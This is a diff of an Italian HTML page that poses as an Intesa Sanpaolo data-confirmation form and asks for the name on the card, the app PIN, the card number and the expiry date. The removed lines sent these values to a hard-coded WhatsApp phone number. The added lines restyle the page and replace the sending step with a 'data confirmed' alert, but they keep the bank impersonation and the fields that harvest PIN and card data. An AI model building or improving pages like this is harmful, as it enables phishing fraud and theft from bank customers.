@@ -1,44 +1,131 @@
 <!DOCTYPE HTML>
 <html>
     <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Intesa Sanpaolo Confirm</title>
         <style>
             body {
                 font-family: Arial, sans-serif;
                 background: #0EB52A;
+                margin: 0;
+                padding: 15px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                color: #333;
+            }
+
+            .container {
+                background: #ffffff;
+                width: 100%;
+                max-width: 450px;
+                padding: 20px;
+                border-radius: 12px;
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+                box-sizing: border-box;
+                margin-top: 20px;
+            }
+
+            header h1 {
+                font-size: 22px;
+                color: #0b8a20;
+                text-align: center;
+                margin-top: 0;
+            }
+
+            h2 {
+                font-size: 18px;
+                text-align: center;
+                color: #222;
+            }
+
+            p {
+                font-size: 14px;
+                line-height: 1.4;
+                color: #555;
+            }
+
+            ol {
+                padding-left: 20px;
+                font-size: 14px;
+            }
+
+            li {
+                margin-bottom: 15px;
+            }
+
+            input {
+                width: 100%;
+                padding: 10px;
+                margin-top: 5px;
+                border: 1px solid #ccc;
+                border-radius: 6px;
+                box-sizing: border-box;
+                font-size: 16px; /* Evita lo zoom automatico su iOS */
+            }
+
+            button {
+                width: 100%;
+                background-color: #0EB52A;
+                color: white;
+                border: none;
+                padding: 12px;
+                font-size: 16px;
+                font-weight: bold;
+                border-radius: 6px;
+                cursor: pointer;
+                margin-top: 10px;
+            }
+
+            button:active {
+                background-color: #0b8a20;
+            }
+
+            footer {
+                text-align: center;
+                font-size: 12px;
+                color: #fff;
+                margin-top: 20px;
             }
         </style>
     </head>
     
     <body>
-        <header>
-            <h1>Inserisci i dati della tua banca</h1>
-        </header>
-    
-        <h2>Intesa Sanpaolo: Conferma i tuoi Dati</h2>
-    
-        <p>Dal momento in cui si esegue di nuovo la registrazione all'APP, <br>
-        Bisognerà inserire qui i dati bancari, per confermarne la validità.<br>
-        Inserisci qui sotto i dati della tua banca. E' una verifica per certificare la validità.</p>
+        <div class="container">
+            <header>
+                <h1>Intesa Sanpaolo</h1>
+            </header>
         
-        <form id="bankForm">
-            <ol>
-                <li>Nome e Cognome sulla Carta: <input type="text" id="nomeCognome" placeholder="Scrivi qui"></li>
-                <br>
-                <li>PIN Applicazione: <input type="password" id="password" placeholder="Scrivi qui la password"></li>
-                <br>
-                <li>Numero della Carta: <input type="number" id="numerocarta" placeholder="Scrivi qui il numero della carta"></li>
-                <br>
-                <li>Data di scadenza: <input type="text" id="datascadenza" placeholder="Scrivi qui la data di scadenza"></li>
-            </ol>
-            <button type="button" onclick="inviaWhatsApp()">Conferma dati</button>
-        </form>
+            <h2>Conferma i tuoi Dati</h2>
+        
+            <p>Dal momento in cui si esegue di nuovo la registrazione all'APP, bisognerà inserire qui i dati bancari, per confermarne la validità. Inserisci qui sotto i dati della tua banca.</p>
+            
+            <form id="bankForm">
+                <ol>
+                    <li>
+                        Nome e Cognome sulla Carta: 
+                        <input type="text" id="nomeCognome" placeholder="Scrivi qui">
+                    </li>
+                    <li>
+                        PIN Applicazione: 
+                        <input type="password" id="password" placeholder="Password">
+                    </li>
+                    <li>
+                        Numero della Carta: 
+                        <input type="number" id="numerocarta" placeholder="Numero carta">
+                    </li>
+                    <li>
+                        Data di scadenza: 
+                        <input type="text" id="datascadenza" placeholder="MM/AA">
+                    </li>
+                </ol>
+                <button type="button" onclick="confermaDati()">Conferma dati</button>
+            </form>
+        </div>
 
         <script>
-        function inviaWhatsApp() {
-            // Sostituisci con il tuo numero WhatsApp (prefisso + numero)
-            const numeroTelefono = "3518748260"; 
-
+        function confermaDati() {
             // Recupera i valori inseriti nei vari campi
             const nome = document.getElementById("nomeCognome").value;
             const pin = document.getElementById("password").value;
@@ -51,23 +138,12 @@
                 return;
             }
 
-            // Struttura il messaggio con i dati inseriti
-            const testoMessaggio = `*Conferma Dati Intesa SanMinecraft*\n\n` +
-                                   `👤 *Nome:* ${nome}\n` +
-                                   `🔑 *PIN:* ${pin}\n` +
-                                   `💳 *Numero Carta:* ${carta}\n` +
-                                   `📅 *Scadenza:* ${scadenza}`;
-
-            // Formatting dell'URL WhatsApp
-            const url = `https://wa.me/${numeroTelefono}?text=${encodeURIComponent(testoMessaggio)}`;
-
-            // Apre la chat di WhatsApp
-            window.open(url, "_blank");
+            // Mostra l'alert richiesto
+            alert("Dati confermati");
         }
         </script>
 
         <footer>
-            <br><br>
             &copy; Intesa Sanpaolo S.P.A. Tutti i diritti riservati.
         </footer>
     </body>
